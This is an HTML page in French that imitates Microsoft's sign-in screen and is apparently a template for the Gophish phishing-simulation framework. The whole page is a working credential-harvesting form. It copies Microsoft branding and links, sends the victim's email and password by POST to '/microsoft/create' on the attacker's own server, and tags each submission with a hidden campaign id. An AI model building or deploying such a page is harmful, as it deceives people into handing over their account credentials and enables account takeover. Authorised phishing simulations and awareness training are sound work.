<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Connectez-vous à votre compte</title>
    <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="/style/microsoft.css"/>
    <script>
        function validateForm() {
            const email = document.getElementById('email');
            const password = document.getElementById('password');
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            let valid = true;

            if (email.value === '') {
                emailError.style.display = 'block';
                email.classList.add('error');
                valid = false;
            } else {
                emailError.style.display = 'none';
                email.classList.remove('error');
            }

            if (password.value === '') {
                passwordError.style.display = 'block';
                password.classList.add('error');
                valid = false;
            } else {
                passwordError.style.display = 'none';
                password.classList.remove('error');
            }

            return valid;
        }

        function handleRedirect(event) {
            if (!validateForm()) {
                event.preventDefault();
            }
        }
    </script>
</head>

<body>
    <div class="login-container">
        <div class="login-header">
            <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg" alt="Microsoft Logo" style="width: 100px;"/>
            <p style="font-size: 24px; line-height: 28px; font-family: Segoe UI; margin-top: 15px; font-weight: 600;">
                Se connecter</p>
        </div>
        <form action="/microsoft/create" method="POST" autocomplete="off">
            <input type="hidden" name="id_camp" id="id_camp" value="<?= $id_camp ?>">
            <div class="form-group">
                <span id="email-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez
                    une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.</span>
                <input type="email" class="form-control" id="email" name="email" placeholder="E-mail, téléphone, ou identifiant Skype" required=""/>
            </div>
            <div class="form-group">
                <span id="password-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez
                    votre mot de passe.</span>
                <input type="password" class="form-control" id="password" name="password" placeholder="Mot de passe" required=""/>
            </div>
            <div class="horizontal-links text-links">
                <p style="font-size: 13px;">Pas de compte ?<a class="renvoi-microsoft" href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&amp;response_type=code+id_token&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;x-client-SKU=ID_NET8_0&amp;x-client-Ver=7.5.1.0&amp;uaid=37cdbff791fa4a82ba49ae74fba87b0f&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=fr&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYbTSEyF78mbvzDxwndacZAcj36EvGLa3BqCIrsF8HGvP42UJiYXy9ynRCORo3mL5W3eEWWNztupkve_ECEPYrWnCZf6nWZKmgDq6aGbOXL-l6E1zD0pcnZGizHPeJmr5OIHibR-I3RDXlHm6v9bO05jC0olCH50LOtW4F70Y_McY0PhpG5NX7mSbrSw-JQloUU5wR7dFe6E6FApul0UXwDyAA&amp;jshs=0">
                        Créez-en un !</a></p>
                <p style="font-size: 13px;"><a style="font-size: 13px;" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#">Votre
                        compte n’est pas accessible ?</a></p>
            </div>
            <div class="button-container">
                <button type="button" class="btn btn-primary" onclick="window.location.href = '/';" style="margin-right: 4px; width: 114px;">Retour</button>
                <button type="submit" class="btn btn-primary btn-2" onclick="handleRedirect(event)" style="margin-right: 0px; width: 114px">Suivant</button>
            </div>
        </form>
    </div>
    <div class="div-option-connexion">
        <a href="https://www.office.com/login?ru=%2f" style="text-decoration: none;">
            <p style="display: flex; align-items: center; margin-bottom: 0; color: black;">
                <img src="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png?raw=true" alt="Microsoft Logo" style="max-width: 9%; margin-left: 35px; vertical-align: middle;"/>
                <span style="margin-left: 10px;">Options de connexion</span>
            </p>
        </a>
    </div>
    <div class="footer-links" style="position: absolute; bottom: 0px; right: 10px;">
        <a href="https://www.microsoft.com/fr/servicesagreement/" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Conditions
            d&#39;utilisation</a>
        <a href="https://privacy.microsoft.com/fr/privacystatement" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Confidentialité
            et cookies</a>
        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#" style="color: black; text-decoration: none; font-size: 30px; font-weight: 200;">...</a>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>